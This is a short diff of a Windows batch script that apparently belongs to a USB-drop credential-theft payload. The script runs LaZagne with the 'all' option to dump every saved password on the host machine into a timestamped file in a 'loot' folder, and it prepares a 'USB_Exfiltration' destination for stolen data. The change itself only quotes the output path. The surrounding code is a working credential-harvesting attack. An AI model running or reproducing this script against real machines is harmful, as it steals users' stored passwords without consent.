@@ -11,7 +11,7 @@ REM This executes LaZagne in the current directory and outputs the password file
 REM Time and Date is also added
 setlocal
 cd /d %~dp0
-%~dp0\laZagne.exe all > %~dp0\..\..\loot\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%_passwords.txt
+%~dp0\laZagne.exe all > "%~dp0\..\..\loot\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%_passwords.txt"
 
 REM These lines if you just want Passwords and no files.
 set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
